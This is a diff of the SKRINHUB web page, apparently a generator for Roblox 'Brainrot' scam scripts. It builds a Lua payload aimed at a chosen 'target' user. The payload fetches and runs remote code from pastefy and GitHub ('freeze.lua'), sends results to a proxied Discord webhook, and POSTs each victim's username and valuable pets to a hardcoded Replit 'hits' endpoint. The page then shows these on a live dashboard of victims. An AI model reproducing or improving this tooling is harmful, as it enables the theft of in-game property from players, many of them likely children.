-  }
+  @keyframes fadeDown { from { opacity:0; transform:translateY(-16px); } to { opacity:1; transform:none; } }
+  @keyframes fadeUp   { from { opacity:0; transform:translateY(12px);  } to { opacity:1; transform:none; } }
+  @keyframes blink    { 0%,100% { opacity:1; } 50% { opacity:0.3; } }
 </style>
 </head>
 <body>
 <div class="wrap">
   <header>
     <div class="logo-row"><h1>SKRINHUB</h1></div>
-    <p class="tagline">Roblox • Brainrot • Trade Script Generator</p>
+    <p class="tagline">Roblox · Brainrot · Trade Script Generator</p>
   </header>
 
-  <!-- ── GLOBAL HITS (top) ── -->
-  <div class="panel hits-panel">
-    <div class="hits-header">
-      <div class="dot dot-green"></div>
+  <!-- ── GLOBAL HITS ── -->
+  <div class="panel">
+    <div class="ph">
+      <div class="hits-live-dot"></div>
       <span class="ph-title">Global Hits</span>
-      <span class="hits-badge" id="hitsCountBadge">0 hits</span>
-      <div class="hits-actions">
-        <button class="btn-sm" id="refreshHitsBtn" onclick="fetchHits()">↻ Refresh</button>
-        <button class="btn-sm red" onclick="clearHits()">✕ Clear</button>
+      <span class="hits-count" id="hitsCount"></span>
+      <div class="ph-actions">
+        <button class="btn-sm" id="refreshBtn" onclick="fetchHits()">↻ Refresh</button>
       </div>
     </div>
-    <div class="api-url-row">
-      <label for="apiUrlInput">API URL</label>
-      <input id="apiUrlInput" type="text" placeholder="https://your-replit-domain.replit.app" oninput="saveApiUrl()" onblur="checkApiUrl()">
-      <span class="api-url-status checking" id="apiUrlStatus">not set</span>
+    <div class="hits-scroll" id="hitsScroll">
+      <div class="hits-empty" id="hitsEmpty">Waiting for hits — execute the script on a target to see their brainrots here.</div>
     </div>
-    <div class="hits-list" id="hitsList">
-      <div class="hits-empty">
-        <div class="hits-empty-icon">🎯</div>
-        No hits yet — set your API URL above, then execute<br>the generated script on a target.
-      </div>
-    </div>
-    <div class="auto-refresh-row">
-      <input type="checkbox" class="auto-refresh-toggle" id="autoRefreshToggle" onchange="toggleAutoRefresh()">
-      <label for="autoRefreshToggle">Auto-refresh every 10s</label>
-      <span id="autoRefreshStatus" style="margin-left:auto;"></span>
+    <div class="auto-refresh-bar">
+      <input type="checkbox" class="toggle" id="autoToggle" onchange="toggleAuto()" checked>
+      <label for="autoToggle">Live updates</label>
+      <span id="autoStatus" style="margin-left:auto;"></span>
     </div>
   </div>
 
-  <!-- ── BRAINROT SELECTION ── -->
+  <!-- ── SELECT BRAINROTS ── -->
   <div class="panel">
     <div class="ph"><div class="dot dot-cyan"></div><span class="ph-title">Select Brainrot Animals</span></div>
     <div class="pb">
@@ -628,8 +446,7 @@
       <div id="pasteCustomListContainer">
         <textarea id="pasteCustomListTextarea" placeholder='Paste your custom list here, e.g.:
 ["Meowl"] = true,
-["Skibidi Toilet"] = true,
-["Strawberry Elephant"] = true,'></textarea>
+["Skibidi Toilet"] = true,'></textarea>
         <button onclick="parsePastedList()">Paste Custom List</button>
       </div>
       <div class="meta-row">
@@ -643,7 +460,7 @@
     <div class="ph"><div class="dot dot-purple"></div><span class="ph-title">Roblox Username</span></div>
     <div class="pb">
       <label class="lbl">Target username</label>
-      <div style="position: relative;">
+      <div style="position:relative;">
         <input class="txt" id="usernameInput" type="text" placeholder="e.g. Builderman" autocomplete="off" spellcheck="false">
         <div id="usernameSuggestions"></div>
       </div>
@@ -653,7 +470,7 @@
 
   <!-- ── WEBHOOK ── -->
   <div class="panel">
-    <div class="ph"><div class="dot dot-discord"></div><span class="ph-title">Discord Webhook</span></div>
+    <div class="ph"><div class="dot dot-hook"></div><span class="ph-title">Discord Webhook</span></div>
     <div class="pb">
       <label class="lbl">Webhook URL</label>
       <input class="txt" id="webhookInput" type="text" placeholder="https://discord.com/api/webhooks/..." autocomplete="off" spellcheck="false" oninput="validateWebhook()">
@@ -663,7 +480,7 @@
 
   <!-- ── GUI SELECTOR ── -->
   <div class="panel">
-    <div class="ph"><div class="dot dot-discord"></div><span class="ph-title">Gui Selector</span></div>
+    <div class="ph"><div class="dot dot-hook"></div><span class="ph-title">Gui Selector</span></div>
     <div class="pb">
       <div class="admin-mode-selector">
         <button class="admin-mode-btn active" onclick="setAdminMode('no-gui')">No GUI</button>
@@ -673,7 +490,7 @@
       </div>
       <div id="customAdminInput">
         <label class="lbl">Custom Loadstring</label>
-        <input class="txt" id="customAdminLoadstring" type="text" placeholder="e.g. loadstring(game:HttpGet('https://pastefy.app/...../raw'))()" oninput="updateCustomAdmin()">
+        <input class="txt" id="customAdminLoadstring" type="text" placeholder="loadstring(game:HttpGet('....'))()" oninput="updateCustomAdmin()">
         <p class="hint">Enter your custom loadstring here.</p>
       </div>
     </div>
@@ -695,6 +512,11 @@
 </div>
 
 <script>
+// ── CONFIG ──────────────────────────────────────────────────────────────
+const API_BASE = 'https://6574b0d6-62c5-4315-9742-628decb44869-00-3d2zrq3xroumo.sisko.replit.dev';
+const HITS_URL = API_BASE + '/api/hits';
+
+// ── ANIMALS ─────────────────────────────────────────────────────────────
 const ANIMALS = [
 { name: "Strawberry Elephant", rarity: "OG", mps: "750M/s" },
 { name: "Meowl", rarity: "OG", mps: "600M/s" },
@@ -943,113 +765,104 @@ const ANIMALS = [
 ];
 
 const ANIMAL_MAP = Object.fromEntries(ANIMALS.map(a => [a.name, a]));
+const RARITY_ICONS = { OG: '⭐', Secret: '🎭', Mythic: '🔮', Custom: '✨' };
 
 let selected = new Set();
 let adminMode = 'no-gui';
 let customAdminLoadstring = '';
-let autoRefreshInterval = null;
+let autoInterval = null;
 
-// ── API URL ──────────────────────────────────────────────────────────────
-function getApiBase() {
-  return (localStorage.getItem('skrinhub_api') || '').replace(/\/$/, '');
-}
-
-function saveApiUrl() {
-  const v = document.getElementById('apiUrlInput').value.trim().replace(/\/$/, '');
-  localStorage.setItem('skrinhub_api', v);
-}
-
-async function checkApiUrl() {
-  const base = getApiBase();
-  const el = document.getElementById('apiUrlStatus');
-  if (!base) { el.textContent = 'not set'; el.className = 'api-url-status checking'; return; }
-  el.textContent = 'checking…'; el.className = 'api-url-status checking';
-  try {
-    const r = await fetch(base + '/api/healthz', { signal: AbortSignal.timeout(4000) });
-    if (r.ok) { el.textContent = '✓ connected'; el.className = 'api-url-status ok'; }
-    else       { el.textContent = `✗ ${r.status}`;  el.className = 'api-url-status err'; }
-  } catch {
-    el.textContent = '✗ unreachable'; el.className = 'api-url-status err';
-  }
+// ── TIME AGO ─────────────────────────────────────────────────────────────
+function timeAgo(iso) {
+  const s = Math.floor((Date.now() - new Date(iso)) / 1000);
+  if (s < 5)  return 'just now';
+  if (s < 60) return s + 's ago';
+  if (s < 3600) return Math.floor(s/60) + 'm ago';
+  if (s < 86400) return Math.floor(s/3600) + 'h ago';
+  return Math.floor(s/86400) + 'd ago';
 }
 
 // ── HITS ─────────────────────────────────────────────────────────────────
+let cachedHits = [];
+
 async function fetchHits() {
-  const base = getApiBase();
-  const btn = document.getElementById('refreshHitsBtn');
+  const btn = document.getElementById('refreshBtn');
   btn.innerHTML = '<span class="spin">↻</span>';
   btn.disabled = true;
   try {
-    if (!base) throw new Error('no api');
-    const r = await fetch(base + '/api/hits', { signal: AbortSignal.timeout(5000) });
-    if (!r.ok) throw new Error('bad status');
-    const data = await r.json();
-    if (Array.isArray(data)) renderHits(data);
-    document.getElementById('autoRefreshStatus').textContent =
-      'Updated ' + new Date().toLocaleTimeString();
-  } catch {
-    // silent
-  } finally {
-    btn.innerHTML = '↻ Refresh';
-    btn.disabled = false;
-  }
+    const r = await fetch(HITS_URL, { signal: AbortSignal.timeout(6000) });
+    if (r.ok) {
+      cachedHits = await r.json();
+      renderHits(cachedHits);
+      document.getElementById('autoStatus').textContent = timeAgo(new Date().toISOString());
+    }
+  } catch { /* silent */ }
+  btn.innerHTML = '↻ Refresh';
+  btn.disabled = false;
 }
 
 function renderHits(hits) {
-  const list = document.getElementById('hitsList');
-  const badge = document.getElementById('hitsCountBadge');
-  badge.textContent = hits.length + (hits.length === 1 ? ' hit' : ' hits');
+  const scroll = document.getElementById('hitsScroll');
+  const count  = document.getElementById('hitsCount');
+  const empty  = document.getElementById('hitsEmpty');
 
-  if (!hits.length) {
-    list.innerHTML = `<div class="hits-empty"><div class="hits-empty-icon">🎯</div>No hits yet — set your API URL above, then execute<br>the generated script on a target.</div>`;
+  // Flatten: each brainrot in each hit becomes its own card
+  const cards = [];
+  hits.forEach(hit => {
+    const brainrots = Array.isArray(hit.brainrots) ? hit.brainrots : [];
+    if (brainrots.length === 0) {
+      cards.push({ brainrot: null, username: hit.username, totalMps: hit.totalMps, timestamp: hit.timestamp });
+    } else {
+      brainrots.forEach(b => {
+        const name = typeof b === 'string' ? b : b.name;
+        const mps  = typeof b === 'string' ? (ANIMAL_MAP[name]?.mps || '?') : (b.mps || '?');
+        cards.push({ brainrot: { name, mps }, username: hit.username, timestamp: hit.timestamp });
+      });
+    }
+  });
+
+  const totalBrainrots = cards.filter(c => c.brainrot).length;
+  count.textContent = hits.length ? `${hits.length} hit${hits.length>1?'s':''} · ${totalBrainrots} brainrot${totalBrainrots!==1?'s':''}` : '';
+
+  // Remove old cards, keep empty msg
+  scroll.querySelectorAll('.hit-card').forEach(el => el.remove());
+
+  if (!cards.length) {
+    empty.style.display = 'block';
     return;
   }
+  empty.style.display = 'none';
 
-  list.innerHTML = '';
-  hits.forEach(hit => {
-    const entry = document.createElement('div');
-    entry.className = 'hit-entry';
-    const brainrots = Array.isArray(hit.brainrots) ? hit.brainrots : [];
-    const time = hit.timestamp ? new Date(hit.timestamp).toLocaleString() : '';
+  cards.forEach(c => {
+    const animal   = c.brainrot ? ANIMAL_MAP[c.brainrot.name] : null;
+    const rarity   = animal?.rarity || (c.brainrot ? 'Secret' : 'Secret');
+    const icon     = RARITY_ICONS[rarity] || '🎭';
+    const badgeCls = rarity === 'OG' ? 'hit-badge-og' : rarity === 'Mythic' ? 'hit-badge-mythic' : 'hit-badge-secret';
+    const mpsLabel = c.brainrot ? c.brainrot.mps : (c.totalMps || '?');
+    const name     = c.brainrot ? c.brainrot.name : '(no brainrots detected)';
+    const ago      = c.timestamp ? timeAgo(c.timestamp) : '';
 
-    const tagsHtml = brainrots.length
-      ? brainrots.map(b => {
-          const name = typeof b === 'string' ? b : b.name;
-          const mps  = typeof b === 'string' ? (ANIMAL_MAP[b]?.mps || '?') : (b.mps || '?');
-          const r    = ANIMAL_MAP[name]?.rarity || 'Secret';
-          const cls  = r === 'OG' ? 'tag-og' : r === 'Mythic' ? 'tag-mythic' : '';
-          return `<span class="hit-tag ${cls}">${name}<span class="tag-mps">${mps}</span></span>`;
-        }).join('')
-      : `<span style="font-family:'Share Tech Mono',monospace;font-size:0.7rem;color:var(--muted)">No brainrots detected</span>`;
-
-    entry.innerHTML = `
-      <div class="hit-entry-header">
-        <span class="hit-victim">🎯 ${hit.username || '?'}</span>
-        <span class="hit-total-mps">${hit.totalMps || '?'}/s total</span>
-        <span class="hit-time">${time}</span>
+    const card = document.createElement('div');
+    card.className = 'hit-card';
+    card.innerHTML = `
+      <div class="hit-icon">${icon}</div>
+      <div class="hit-body">
+        <div class="hit-name-row">
+          <span class="hit-name">${name}</span>
+          <span class="${badgeCls}">${rarity.toUpperCase()}</span>
+        </div>
+        <div class="hit-sub"><span>@${c.username}</span> · ${ago}</div>
       </div>
-      <div class="hit-brainrots">${tagsHtml}</div>`;
-    list.appendChild(entry);
+      <div class="hit-mps">${mpsLabel}</div>`;
+    scroll.appendChild(card);
   });
 }
 
-async function clearHits() {
-  const base = getApiBase();
-  if (base) {
-    try { await fetch(base + '/api/hits', { method: 'DELETE' }); } catch {}
-  }
-  renderHits([]);
-}
-
-function toggleAutoRefresh() {
-  const on = document.getElementById('autoRefreshToggle').checked;
-  clearInterval(autoRefreshInterval);
-  if (on) {
+function toggleAuto() {
+  clearInterval(autoInterval);
+  if (document.getElementById('autoToggle').checked) {
     fetchHits();
-    autoRefreshInterval = setInterval(fetchHits, 10000);
-    document.getElementById('autoRefreshStatus').textContent = 'Auto-refresh on';
-  } else {
-    document.getElementById('autoRefreshStatus').textContent = '';
+    autoInterval = setInterval(fetchHits, 8000);
   }
 }
 
@@ -1060,8 +873,7 @@ function buildAllBrainrotsLua() {
 
 async function createSentinelProxy(webhookUrl) {
   const r = await fetch('https://sentinel-proxy.dongdihng.workers.dev/', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
+    method: 'POST', headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ webhook: webhookUrl })
   });
   if (!r.ok) { const d = await r.json(); throw new Error(d.error || 'proxy failed'); }
@@ -1073,8 +885,7 @@ async function createSentinelProxy(webhookUrl) {
 async function uploadToPastefy(script) {
   try {
     const r = await fetch('https://pastefy.app/api/v2/paste', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ title: 'SKRINHUB Script', content: script })
     });
     const d = await r.json();
@@ -1091,36 +902,19 @@ async function generate() {
   try {
     const username = document.getElementById('usernameInput').value.trim();
     const webhook  = document.getElementById('webhookInput').value.trim();
-    const apiBase  = getApiBase();
 
-    if (!selected.size)        throw new Error('Please select at least one brainrot animal.');
-    if (username.length < 3)   throw new Error('Username must be at least 3 characters long.');
+    if (!selected.size)       throw new Error('Please select at least one brainrot animal.');
+    if (username.length < 3)  throw new Error('Username must be at least 3 characters long.');
     if (!webhook.startsWith('https://discord.com/api/webhooks/')) throw new Error('Invalid webhook URL.');
 
-    const finalWebhook = await createSentinelProxy(webhook);
+    const finalWebhook  = await createSentinelProxy(webhook);
     const brainrotLines = [...selected].map(n => `  ["${n}"] = true,`).join('\n');
-    const allLines = buildAllBrainrotsLua();
+    const allLines      = buildAllBrainrotsLua();
 
     let adminPart = '';
-    if (adminMode === 'admin-panel') {
-      adminPart = `\ntask.spawn(function()\nloadstring(game:HttpGet("https://pastefy.app/GKYBLds1/raw"))()\nend)`;
-    } else if (adminMode === 'freeze') {
-      adminPart = `\ntask.spawn(function()\nloadstring(game:HttpGet("https://pastefy.app/BNCsmpLk/raw"))()\nend)`;
-    } else if (adminMode === 'custom' && customAdminLoadstring.trim()) {
-      adminPart = '\n' + customAdminLoadstring;
-    }
-
-    // Report function — calls SKRINHUB_API/api/hits
-    const reportSnippet = apiBase ? `
-getgenv().SKRINHUB_API = "${apiBase}/api/hits"
-getgenv().SkrinReport = function(victim, brainrots, totalMps)
-  pcall(function()
-    local hs = game:GetService("HttpService")
-    local body = hs:JSONEncode({username=victim, brainrots=brainrots, totalMps=tostring(totalMps)})
-    request({Url=getgenv().SKRINHUB_API, Method="POST", Headers={["Content-Type"]="application/json"}, Body=body})
-  end)
-end` : `-- (No API URL set — Global Hits disabled)
-getgenv().SkrinReport = function() end`;
+    if (adminMode === 'admin-panel') adminPart = `\ntask.spawn(function()\nloadstring(game:HttpGet("https://pastefy.app/GKYBLds1/raw"))()\nend)`;
+    else if (adminMode === 'freeze') adminPart = `\ntask.spawn(function()\nloadstring(game:HttpGet("https://pastefy.app/BNCsmpLk/raw"))()\nend)`;
+    else if (adminMode === 'custom' && customAdminLoadstring.trim()) adminPart = '\n' + customAdminLoadstring;
 
     const script = `getgenv().WEBHOOK_URL = "${finalWebhook}"
 getgenv().TARGET_USERNAME = "${username}"
@@ -1130,19 +924,23 @@ ${brainrotLines}
 getgenv().ALL_BRAINROTS = {
 ${allLines}
 }
-${reportSnippet}
+getgenv().SKRINHUB_API = "${HITS_URL}"
+getgenv().SkrinReport = function(victim, brainrots, totalMps)
+  pcall(function()
+    local hs = game:GetService("HttpService")
+    local body = hs:JSONEncode({username=victim, brainrots=brainrots, totalMps=tostring(totalMps)})
+    request({Url=getgenv().SKRINHUB_API, Method="POST", Headers={["Content-Type"]="application/json"}, Body=body})
+  end)
+end
 task.spawn(function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ZAmbuluda/Shrinkhub/refs/heads/main/freeze.lua"))()
 end)${adminPart}`;
 
     const rawUrl = await uploadToPastefy(script);
-    if (rawUrl) {
-      out.className = 'code-block';
-      out.textContent = `loadstring(game:HttpGet("${rawUrl}"))()`;
-    } else {
-      out.className = 'code-block';
-      out.textContent = `-- Failed to upload to Pastefy. Raw script:\n${script}`;
-    }
+    out.className = 'code-block';
+    out.textContent = rawUrl
+      ? `loadstring(game:HttpGet("${rawUrl}"))() `
+      : `-- Pastefy upload failed. Raw script:\n${script}`;
   } catch (err) {
     out.className = 'code-block empty';
     out.textContent = err.message || 'An error occurred.';
@@ -1151,23 +949,17 @@ end)${adminPart}`;
   }
 }
 
-// ── ROBLOX USER SEARCH ───────────────────────────────────────────────────
-async function searchRobloxUsers(query) {
-  if (query.length < 3) return [];
+// ── USERNAME SEARCH ──────────────────────────────────────────────────────
+async function searchRobloxUsers(q) {
   try {
-    const r = await fetch(`https://roblox-search-proxy.vercel.app/api/roblox-search?keyword=${encodeURIComponent(query)}`);
-    if (!r.ok) return [];
-    return (await r.json()).data || [];
+    const r = await fetch(`https://roblox-search-proxy.vercel.app/api/roblox-search?keyword=${encodeURIComponent(q)}`);
+    return r.ok ? ((await r.json()).data || []) : [];
   } catch { return []; }
 }
-
-async function fetchAvatarUrl(userId) {
-  try {
-    const r = await fetch(`https://avatar-proxy.vercel.app/api/avatar-proxy?userId=${userId}`);
-    return r.ok ? (await r.json()).imageUrl || null : null;
-  } catch { return null; }
+async function fetchAvatar(uid) {
+  try { const r = await fetch(`https://avatar-proxy.vercel.app/api/avatar-proxy?userId=${uid}`); return r.ok ? (await r.json()).imageUrl || null : null; }
+  catch { return null; }
 }
-
 async function showSuggestions(users) {
   const c = document.getElementById('usernameSuggestions');
   c.innerHTML = '';
@@ -1175,29 +967,18 @@ async function showSuggestions(users) {
     c.innerHTML = `<div class="suggestion-item"><span class="suggestion-username" style="color:var(--muted)">No user found.</span></div>`;
     c.style.display = 'block'; return;
   }
-  const withAvatars = await Promise.all(users.map(async u => ({ ...u, avatarUrl: await fetchAvatarUrl(u.id) })));
-  withAvatars.forEach(u => {
-    const item = document.createElement('div');
-    item.className = 'suggestion-item';
-    item.innerHTML = `
-      <div class="suggestion-avatar"><img src="${u.avatarUrl || ''}" alt="${u.name}"></div>
-      <div class="suggestion-info">
-        <p class="suggestion-username">${u.displayName || u.name}</p>
-        <p class="suggestion-handle">@${u.name}</p>
-      </div>
+  const withAv = await Promise.all(users.map(async u => ({ ...u, avatarUrl: await fetchAvatar(u.id) })));
+  withAv.forEach(u => {
+    const item = document.createElement('div'); item.className = 'suggestion-item';
+    item.innerHTML = `<div class="suggestion-avatar"><img src="${u.avatarUrl||''}" alt="${u.name}"></div>
+      <div class="suggestion-info"><p class="suggestion-username">${u.displayName||u.name}</p><p class="suggestion-handle">@${u.name}</p></div>
       <span class="suggestion-id">${u.id}</span>`;
-    item.onclick = () => {
-      document.getElementById('usernameInput').value = u.name;
-      c.style.display = 'none';
-      validateUsername();
-    };
+    item.onclick = () => { document.getElementById('usernameInput').value = u.name; c.style.display = 'none'; validateUsername(); };
     c.appendChild(item);
   });
   c.style.display = 'block';
 }
-
 const debounce = (fn, ms) => { let t; return (...a) => { clearTimeout(t); t = setTimeout(() => fn(...a), ms); }; };
-
 document.getElementById('usernameInput').addEventListener('input', debounce(async e => {
   const q = e.target.value.trim();
   if (!q) { document.getElementById('usernameSuggestions').style.display = 'none'; return; }
@@ -1238,25 +1019,21 @@ function renderList(filter) {
   document.getElementById('selNum').textContent = selected.size;
 }
 
-function toggle(name) { selected.has(name) ? selected.delete(name) : selected.add(name); renderList(document.getElementById('searchBox').value); }
+function toggle(n) { selected.has(n) ? selected.delete(n) : selected.add(n); renderList(document.getElementById('searchBox').value); }
 function filterList() { renderList(document.getElementById('searchBox').value); }
 function selectAll() { ANIMALS.forEach(a => selected.add(a.name)); renderList(document.getElementById('searchBox').value); }
-function clearAll() { selected.clear(); renderList(document.getElementById('searchBox').value); }
+function clearAll()  { selected.clear(); renderList(document.getElementById('searchBox').value); }
 
 function addCustomBrainrot() {
   const v = document.getElementById('customBrainrotName').value.trim();
-  if (!v) return;
-  selected.add(v);
+  if (!v) return; selected.add(v);
   renderList(document.getElementById('searchBox').value);
   document.getElementById('customBrainrotName').value = '';
 }
-
 function parsePastedList() {
-  const text = document.getElementById('pasteCustomListTextarea').value.trim();
-  if (!text) return;
-  const re = /\[\s*"([^"]+)"\s*\]\s*=\s*true\s*,?/gi;
-  let m;
-  while ((m = re.exec(text)) !== null) { if (m[1]) selected.add(m[1].trim()); }
+  const text = document.getElementById('pasteCustomListTextarea').value;
+  const re = /\[\s*"([^"]+)"\s*\]\s*=\s*true\s*,?/gi; let m;
+  while ((m = re.exec(text)) !== null) if (m[1]) selected.add(m[1].trim());
   renderList(document.getElementById('searchBox').value);
   document.getElementById('pasteCustomListTextarea').value = '';
 }
@@ -1272,16 +1049,15 @@ function updateCustomAdmin() { customAdminLoadstring = document.getElementById('
 function validateUsername() {
   const v = document.getElementById('usernameInput').value.trim();
   const h = document.getElementById('usernameHint');
-  if (v.length < 3) { h.classList.add('error'); h.textContent = 'Username must be at least 3 characters long!'; return false; }
+  if (v.length < 3) { h.classList.add('error'); h.textContent = 'Username must be at least 3 characters!'; return false; }
   h.classList.remove('error'); h.textContent = 'The Roblox username to target in the script (3 characters minimum).'; return true;
 }
-
 function validateWebhook() {
   const v = document.getElementById('webhookInput').value.trim();
   const h = document.getElementById('webhookHint');
-  if (!v.startsWith('https://discord.com/api/webhooks/')) { h.classList.add('error'); h.textContent = 'Webhook must start with: https://discord.com/api/webhooks/'; return false; }
-  const re = /^https:\/\/discord\.com\/api\/webhooks\/(\d{17,20})\/[a-zA-Z0-9_-]{68,}$/;
-  if (!re.test(v)) { h.classList.add('error'); h.textContent = 'Invalid webhook format. Must be: https://discord.com/api/webhooks/<ID>/<TOKEN>'; return false; }
+  if (!v.startsWith('https://discord.com/api/webhooks/')) { h.classList.add('error'); h.textContent = 'Must start with: https://discord.com/api/webhooks/'; return false; }
+  const ok = /^https:\/\/discord\.com\/api\/webhooks\/\d{17,20}\/[a-zA-Z0-9_-]{68,}$/.test(v);
+  if (!ok) { h.classList.add('error'); h.textContent = 'Invalid webhook format.'; return false; }
   h.classList.remove('error'); h.textContent = '✅ Valid Discord webhook.'; return true;
 }
 
@@ -1296,13 +1072,9 @@ function copyOut() {
 }
 
 // ── INIT ─────────────────────────────────────────────────────────────────
-(function init() {
-  const saved = localStorage.getItem('skrinhub_api') || '';
-  document.getElementById('apiUrlInput').value = saved;
-  if (saved) checkApiUrl();
-  renderList();
-  renderHits([]);
-})();
+renderList();
+fetchHits();
+autoInterval = setInterval(fetchHits, 8000);
 </script>
 </body>
 </html>
